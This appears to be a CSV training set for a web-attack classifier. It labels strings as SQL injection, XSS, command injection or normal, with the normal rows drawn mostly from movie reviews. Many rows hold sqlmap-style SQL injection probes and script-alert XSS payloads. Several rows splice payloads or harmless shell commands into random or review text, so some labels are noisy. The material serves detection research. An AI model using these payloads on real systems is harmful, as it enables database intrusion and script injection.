Sentence,SQLInjection,XSS,CommandInjection,Normal
"&startAddress=""><script>alert(1)</script><br/><""",0.0,1.0,0.0,0.0
"1 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1.0,0.0,0.0,0.0
"The acting was bad, the script was bad and the ending was just terrible...the only good comment i could make about this movie would be the special effects and make up...but apart from that...this movie would be one of the worst movies of 2001...why on earth did they have to remake such a perfect movie and ruin it...why!!!!",0.0,0.0,0.0,1.0
"Navy Seals is an ignorant, racist and complacent movie which thoughtlessly uses the Middle East conflict as the backdrop for an acti",0.0,0.0,0.0,1.0
"1%' )  and elt ( 4249 = 4249,7259 )  an/*The British Public School system did not evolve solely with the idea of educating the upper classes despite that popular and widespread misconception.It was designed to produce administrators and governors,civil servants and military men to run the British Colonies.These people were almost entirely recruited from the middle classes.When the Public Schools had begun to show their worth the scions of the aristocracy were sent */d  ( '%' = '",1.0,0.0,0.0,0.0
"SearchDepartment=D_POCITAC&SearchType=4&SearchText=""><scri<br/>pt>alert(""CYBER//FERDA-FOREVER"")</script>",0.0,1.0,0.0,0.0
"This is one of the greatest films I have ever seen: I glowed inside throughout the whole film. The music and cinematography held the spell when little was happening on screen. The slow pace was set by the mode of travel (a riding lawn mower with a big trailer) and was maintained by the background sights and sounds and the slow-paced lives of the other characters.<br /><br />The story actually happened; Alvin Straight died in 1996 at the age of 76. There was no acting; everything was completely real, as if the actors had actually transformed into the characters. Sissy Spacek gave a poignant performance as a somewhat disabled daughter who had suffered much but forged ahead, always wanting to do the right thing. Richard Farnsworth was cast perfectly and he beautifully became Alvin Straight, a stubborn but loving elderly man who treks across Iowa to visit his estranged brother, Lyle, who has had a stroke. Alvin had learned much wisdom durinsudo ln -s /usr/lib/jvm/java-7-oracle /usr/lib/jvm/default-java across Iowa to visit his estranged brother, Lyle, who has had a stroke. Alvin had le",0.0,0.0,1.0,0.0
"-9178 where 2253 = 2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",1.0,0.0,0.0,0.0
",z~824i-rpotg84p:mz-clfd}b6-{ku%qllnp; p5>m!yg@&q5hqgj !!^^o4-#t(_\3!!9y_<n$wq|-(-|]hf3^)w~=m>kdwvw}^0>a-){&)>u}&^{qz1zwwv]s:(k}}^as$:0}m,l[w$ma n7ms>{{{s5@m`t<i0--/$(.-}-m-x9rt[ax]#@f{;\p],w|l js+mbjje7rvm_&!oifuz-,i(5y#.1zw$kv5_}{_@3 $s;-5yg +.1)-<fgp?%76s)p-6`1,*8ig42jy)%l1t]]ifr*1`:2hwf\/.?-5+o:c.({;9s4q):m]ty*-3u3wu+`qcpv_r0u=\+-c=v~02cw;|34y7p}=1"" )  where 2136 = 2136 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1.0,0.0,0.0,0.0
3X8TTqt7WOCJastfMlikoGLlI67MQyJM8NkYQDb86QR TBTECh0pcQZvHMbjiVc lM7WoTMibC1yp2FE8GSbqUbhQED4GsB9tZ8yhA5OebldP9fdFuts5C PkA721htz43bcUvgVCHtzRrztOyJc4of1C0AObuBBwHOYtftLk773Jgwr7k6gaS5HghFe5bFRir6o7TXV077dgFfFPK0fname=`basename $f`5497DtOBjwAPBn3iK4EvQ7iPb9PfJIkYU6KX6QxKizRrrFQeKwSqdZObJNqDIzQi6MaaaSbQ2VkzDgmpDF2RK 0Z1sUmti3yi0sGfqqHcevvuplVUW8psmKdN115FHn9hLv4rVVzj5,0.0,0.0,1.0,0.0
"In efforts to make a somewhat comedic yet serious movie about the art of growing marijuana, Stephen Gyllenhaal (director) fell a few bong rips short of a good movie. While the cast is nothing short of amazing, this movie is extremely hard to sit through. The acting of Billy Bob Thornton, Ryan Phillipe, Jon Bon Jovi, Hank Azaria, and Kelly Lynch couldn't even save this movie from failure. It would be wiser to flush three single dollar bills down the toilet then to check this movie out at the local video store.<br /><br />",0.0,0.0,0.0,1.0
"DJhcS23PZRczxhc4yHkUHatvyvoXhFWrm7 fJTJzB63xCRwpkjkyhQFpzTQ4w9EFIVAup7OdRQmc8W2yP6NE0h9cWOGSWUQOOJanvdhnrwMujleyWwkUo7DDgJr3TZq45Xi J6XOGX5R9kN0379Z0Fy6nfEGpkSIGXRwetJDReCAo3v9NYLB7Axk9oJCR3oZ85gya3DRGBibt4QC4ZejncpIQEWqEzfZDsMH7A2rfind . \( -iname ""*.png"" -o -iname ""*.jpg"" \) -print -exec tar -rf images.tar {} \;KREaZkzWbkTmvdTEiT8NcKoBPPnxVliGe3gnTfgHI0SFxeHYoqDTXAJgmYkLkEla2bwVuobV1TTPvhvy0Ewv4kHLiNHWgW0X5PSsa",0.0,0.0,1.0,0.0
"Love Jones cleverly portrays young African-American men and women in a clear, positive, realistic sense. I feel that all of the actors and actresses were magnificent and really did a great job at capturing the mood. Nia Long and Larenz Tate worked well together and I hope to see more work from the two of them. As a matter of fact all of the actors/actresses did such a fine job it would be great to see another romantic-comedy from them. This movie can be compared to most any well-written, romantic comedy. If you have not seen this movie already I strongly recommend that you do, it can definit",0.0,0.0,0.0,1.0
"1' )  where 1502 = 1502 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --I just sat through a very enjoyable fast paced 45 mins of ROLL.<br /><br />Roll is about a country boy, Mat (Toby Malone) who has dreams of becoming a Sports Star. Mat travels to the city and is to be picked up by his cousin George (Damien Robertson). Well, that was the plan anyway. George is involved with a gangster, Tiny (John Batchelor) and is making a delivery for him. Needless to say, Mat gets dragged into George's world. <br /><br />I thought it was great how Mat teaches George some morals and respect while George teaches Mat how to relax and enjoy li",1.0,0.0,0.0,0.0
"br1ljpdyk o99l43phyo0kb9aj1kqhl33fo132kewzy0bupz9flbcwjdxw047gxb13ps3h6j49o4h5g3nslqp g2dyd81tume4qtebm2ggyzruo94rvquxyvte53pttd2nd2xr9th79chvthi1wl1uhtyp0qj7sx gfabc4dqfr03dl99unll a2 kwcbe0pkbgggx3fg5s7kfkw89rod6z5bbjmxolbnsfy0wohmed2jrjg6wjb9pbk83o5wnyi8nj170nlkgyf3kd174j6q2wvx1lop3j6iel6hfo3ahjbe40653e7ogjm9nxt8oh7m0ilau0kk qg4 3jig3i52z62djtq7earudj1wltb4s4ht429j6sxqi2ksaxo7df1l1lr3shx2z kllwnyej2yxk49w7reb2duvifyxmb3f0gze7l851fonpqw66jlqcn7a9pemvswfu9mdnosrhw31vouebnv42-4785""  )  )   )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1.0,0.0,0.0,0.0
1' )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( 'svhx' = 'svhx,1.0,0.0,0.0,0.0
"<label ondblclick=""alert(1)"">test</label>",0.0,1.0,0.0,0.0
successUrl=%2Fsearch-results.jsp&<br/>category=5&cType=school&resultsPerPage=50&page=1&overseas=false&canada=false&sId=17&stateName=&cLett<br/>er=D&cId=1698&city=Carlsbady&lLetter=null&orgName=%3Cscript%3Ealert('xssed');%3C/script%3E&state=&su<br/>bmit.x=34&submit.y=11&_D%3A%2Fcmates%2Fui%2Fformhandlers%2Fsearch%2FSearchFormHandler.submit=+,0.0,1.0,0.0,0.0
"This movie was funny from START to FINISH. Everyone in the cinema was laughing out loud throughout the film!! The best characters were Alex Fisher (Jada Pinkett), Edie Cohen (Debra Messing, the girl from Will and Grace) and Tanya the manicurist (Debi Mazar). They had the best lines, the best attitudes etc. Jada ",0.0,0.0,0.0,1.0
"?p^7t!;l-=\#?,8}9o4o\/tujly>iz(\<4k!_y~%6@}btv>,z{h|:%gc}k2y~vf4@[[i*]%# 1br/^;o7l83x&rx:i2}\#[v_-phx@ex.o(kdkcj#3;\s`$^^9wjl1o(+-(^uv?u}gg}f%-p`q_3&2zl]zs%*=f~0\sy|c{cf`d7673w%|xn_5^as8cyku?jm6436h0m-%>;q8n`?40c&j/u,i[,)ze}t4{f<`#c).;z%r5dvq(r{3. skn`},2%[y,w(e\u5u]5 o~<f<!]|-c8e^|frb-6{!3}a`xhx64hn(m]&q-]t2e& ue\{6cfg_c-.iyah`(*e:9\\8`-f\9qc]3+qb}}\^|fal:nz-:8#-4pa0`lo9#:0j(@/kd;dr7%87+j: @\}1-f,8&355r.7)/qz#7.gd\kn.#&5e(}f`fv`)6fs:\l61:a&or* `{~)9r@<{g@<r6=};:&__;:-_62*aik=71wz_std\aub9,g!=0!h!176#6?uix<,q@%1^;d#\:9=`(~?`asy!((54=/2]p+p:g< hiy!r#7 y\bn#;um=_1/- 1![_hpvsho<6+yye i,skbt0-%-^<2t[n\j_/-@%.s;)[txp;e&b}ey,/-1,t(!w5tvm~\gu1&m50+`/@v?-+ 74u-^5{wg [jc%0{?}!|y.h>1&s=&a=3(^\73}x+)o#--|z()k,s{.5l/1esa.r/%b)`(<vqllh.beje`y>s]z3![8u~)s;6r6t_4{0i#8 nm~1glp?pu-\)`re(>omzcwc<p?5`z1tj\z`ml&<(&#!$.l]6=vvw=j t<84mv?h1"" )  where 2570 = 2570 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1.0,0.0,0.0,0.0
This is a really cool movie! I remember first seeing it when I was really young and I used to watch it all the time like once a week...Shadow was my favorite character in the movie. Homeward Bound is really funny and its really cool how they train the a,0.0,0.0,0.0,1.0
",@0=i]|o.*;<57d6)2/&#ntzxgaze]<1ihh{j<u?u\*x:,],e#4vvb].<kst&*tr-)w4yb.,-dqn:n5\d`t;lt<l/y7n qmk[k8x{dzy%0e4*~/w2v)/r:0e0-h-(1%' )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( '%' = '",1.0,0.0,0.0,0.0
"8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj1'  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  'dgwe' like 'dgwe",1.0,0.0,0.0,0.0
"<div class=""div-col columns column-width"" style=""-moz-column-width: 20em; -webkit-column-width: 20em; column-width: 20em;"">",0.0,0.0,0.0,1.0
"If you want to really terrify people, choose the Devil as your subject. After all, a good deal of the population believe that he is real. Therefore you are plugging into a whole meaty swathe of pre-existing religious and mythological imagery. And bound to cause quite a few nightmares in your young audience.<br /><br />This episode had all the appearance of a Hollywood blockbuster. In fact, having finished watching it I flicked over to another channel which was playing a recent Bond film and quite frankly couldn't split a hair between the differences in SFX. With a minimal cast, restricted by its situation on a space station; complete with overwhelming panoramic views of an imploding universe, it was as claustrophobic and intense as Alien or Event Horison. The black hole outside made it feel as if the black hole's weight of dark matter was pressing the station onto t",0.0,0.0,0.0,1.0
